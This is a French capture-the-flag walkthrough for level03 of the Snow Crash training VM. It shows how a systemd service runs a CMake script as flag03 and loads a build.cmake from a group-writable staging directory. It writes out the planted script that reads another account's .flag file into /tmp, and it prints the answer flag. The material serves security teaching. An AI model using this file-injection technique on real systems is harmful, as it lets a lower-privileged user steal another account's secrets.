# Level03 — Faire exécuter un script CMake

**Point de départ :** une session sur la VM Snow Crash sous `level03`. Le flag de ce niveau sert de mot de passe au compte `level04`.

## Objectif

Comprendre comment un service privilégié peut exécuter des instructions contrôlées par un utilisateur moins privilégié. La faille repose sur la confiance accordée à un fichier CMake modifiable.

## 1. Lire l’indice

```bash
cat README
```

Résultat de référence (à confirmer sur la VM) :

```text
Every Burbclave has rules. Find the loophole.
```

Le README donne le mot-clé `Burbclave`. On l’utilise d’abord pour explorer les noms de fichiers et de répertoires de la VM :

```bash
find / -iname '*burbclave*' 2>/dev/null
```

| Élément | Rôle |
| --- | --- |
| `find /` | Parcourir le système de fichiers depuis sa racine. |
| `-iname '*burbclave*'` | Ne retenir que les chemins dont le nom contient `burbclave`, sans tenir compte de la casse. |
| `2>/dev/null` | Masquer les erreurs d’accès. |

Rechercher notamment `/etc/systemd/system/burbclave.service`, puis examiner cette unité systemd.

## 2. Comprendre le point faible

### 2.1. Le service s’exécute comme `flag03`

```bash
systemctl cat burbclave.service
```

Extrait de configuration à confirmer :

```ini
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardOutput=null
StandardError=null
```

Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Les sorties standard et d’erreur sont redirigées vers `null` dans cet extrait ; le script utilise donc un fichier dans `/tmp`.

### 2.2. `CMakeLists.txt` charge un autre fichier

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

Les instructions suivantes, à confirmer dans le fichier complet, lisent une configuration, calculent un répertoire et chargent `build.cmake` :

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")
include(${RESOLVED_BUILD_PATH}/build.cmake)
```

Vérifier si la configuration est accessible :

```bash
cat /etc/burbclave/burbclave.conf
```

Erreur de référence :

```text
cat: /etc/burbclave/burbclave.conf: Permission denied
```

L’extrait ne suffit pas à établir la valeur de `RESOLVED_BUILD_PATH`.

### 2.3. Trouver un emplacement modifiable

Autre ligne à rechercher dans `CMakeLists.txt` :

```cmake
set(BURBCLAVE_STATE_DIR "/var/lib/burbclave")
```

Examiner ce répertoire :

```bash
find /var/lib/burbclave -maxdepth 2 -type d -ls 2>/dev/null
```

Vérifier les droits du dossier `/var/lib/burbclave/staging` :

```bash
id
ls -ld /var/lib/burbclave/staging
```

Extrait de référence (à confirmer sur la VM) :

```text
uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
drwxrwxr-x 2 root burbclave 4096 Nov 6 10:53 /var/lib/burbclave/staging
```

La commande `id` montre que `level03` appartient au groupe `burbclave`. Dans `drwxrwxr-x`, le deuxième groupe de droits est celui du groupe propriétaire : `rwx`. Le groupe `burbclave` peut donc écrire dans `staging`.

Chemin à tester :

```text
/var/lib/burbclave/staging/build.cmake
```

### 2.4. Confirmer l’hypothèse

Si la configuration est illisible, le chemin doit être confirmé par le test des sections suivantes. Si un nouveau fichier `/tmp/level03_recovered` contenant le flag est effectivement créé par le service, cela permettra d’étayer les deux conclusions suivantes :

1. le chemin calculé par `CMakeLists.txt` mène bien au dossier `staging` ;
2. `build.cmake` est exécuté avec les droits de `flag03`.

## 3. Comprendre le script CMake

Le script CMake utilisé est intégralement reproduit ici :

```cmake
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
```

| Instruction | Effet |
| --- | --- |
| `file(READ ... SECRET)` | Lire `.flag` et placer son contenu dans la variable CMake `SECRET`. |
| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans le fichier de sortie ; vérifier ses droits de lecture. |

CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers.

## 4. Installer le script

Créer le fichier attendu dans le dossier de staging :

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
EOF
```

Dans cette construction :

- `>` crée le fichier ou remplace son contenu ;
- `<<'EOF'` fournit plusieurs lignes à `cat` ;
- les apostrophes autour de `EOF` empêchent Bash d’interpréter `${SECRET}` avant CMake.

## 5. Attendre l’exécution du service

Vérifier si un timer déclenche le service et identifier son prochain passage :

```bash
systemctl list-timers --all
```

Après le passage du service, lire le fichier produit :

```bash
cat /tmp/level03_recovered
```

Flag de référence à comparer au fichier produit :

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

Confirmer que le fichier est créé par le service lors de ce test, et non lors d’une exécution antérieure.
